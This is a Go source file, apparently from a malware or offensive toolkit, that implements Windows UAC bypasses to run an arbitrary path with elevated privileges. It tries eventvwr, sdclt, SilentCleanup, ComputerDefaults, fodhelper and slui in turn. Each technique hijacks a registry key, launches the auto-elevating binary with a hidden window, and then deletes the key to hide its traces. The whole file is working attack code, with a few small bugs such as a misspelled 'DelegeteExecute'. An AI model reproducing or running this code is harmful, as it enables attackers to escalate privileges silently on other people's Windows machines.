package main

import (
	"bytes"
	"errors"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

// GetVer gets the major version of the current installed
// Windows
func GetVer() (int, error) {
	cmd := exec.Command("cmd", "ver")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return 0, err
	}
	osStr := strings.Replace(out.String(), "\n", "", -1)
	osStr = strings.Replace(osStr, "\r\n", "", -1)
	tmp1 := strings.Index(osStr, "[Version")
	tmp2 := strings.Index(osStr, "]")
	if tmp1 == -1 || tmp2 == -1 {
		return 0, errors.New("Version string has wrong format")
	}
	longVer := osStr[tmp1+9 : tmp2]
	majorVerStr := strings.SplitN(longVer, ".", 2)[0]
	majorVerInt, err := strconv.Atoi(majorVerStr)
	if err != nil {
		return 0, errors.New("Version could not be converted to int")
	}
	return majorVerInt, nil
}

// CheckElevate checks whether the current process has administrator
// privileges
func CheckElevate() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}

// Uacbypass bypasses User Account Control of Windows and escaletes
// privileges to root if User has root privileges
func Escalate(path string) (err error) {
	version, err := GetVer()

	if err != nil {
		return
	}
	if version == 10 {
		if computerdefaults(path) == nil {
			return
		}
		if sdcltcontrol(path) == nil {
			return
		}
		if fodhelper(path) == nil {
			return
		}
	}
	if version > 9 {
		if silentCleanUp(path) == nil {
			return
		}
		if slui(path) == nil {
			return
		}
	}
	if version < 10 {
		if eventvwr(path) == nil {
			return
		}
	}
	return errors.New("uac bypass failed")
}

//// TODO: cleanup Exploits

// eventvwr works on 7, 8, 8.1 fixed in win 10
func eventvwr(path string) (err error) {
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}

	time.Sleep(2 * time.Second)
	var cmd = exec.Command("eventvwr.exe")
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5 * time.Second)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile`)
	return
}

// sdcltcontrol works on Win 10
func sdcltcontrol(path string) error {
	var cmd *exec.Cmd

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.SET_VALUE)
	if err != nil {
		return err
	}

	if err := key.SetStringValue("", path); err != nil {
		return err
	}

	if err := key.Close(); err != nil {
		return err
	}

	time.Sleep(2 * time.Second)

	cmd = exec.Command("cmd", "/C", "start sdclt.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	time.Sleep(5 * time.Second)

	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`)
	if err != nil {
		return err
	}

	return nil
}

// silentCleanUp works on Win 8.1, 10(patched on some Versions) even on UAC_ALWAYSnotify
func silentCleanUp(path string) (err error) {
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE)
	if err != nil {
		return
	}

	err = key.SetStringValue("windir", path)
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}
	time.Sleep(2 * time.Second)
	var cmd = exec.Command("cmd", "/C", "schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I")
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return
	}
	delkey, _ := registry.OpenKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE)
	delkey.DeleteValue("windir")
	delkey.Close()
	return
}

// computerdefaults works on Win 10 is more reliable than fodhelper
func computerdefaults(path string) (err error) {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`, registry.QUERY_VALUE|registry.SET_VALUE)

	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}
	time.Sleep(2 * time.Second)

	var cmd = exec.Command("cmd", "/C", "start C:\\windows\\system32\\ComputerDefaults.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return
	}

	time.Sleep(5 * time.Second)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
	return
}

// fodhelper works on 10 but computerdefaults is more reliable
func fodhelper(path string) (err error) {
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.SET_VALUE)
	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegeteExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}
	time.Sleep(2 * time.Second)

	var cmd = exec.Command("start fodhelper.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5 * time.Second)
	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`)
	if err != nil {
		return
	}
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
	return
}

// slui works on Win 8.1, 10
func slui(path string) (err error) {
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)

	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}

	time.Sleep(2 * time.Second)

	var cmd = exec.Command("slui.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5 * time.Second)

	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\`)
	return
}
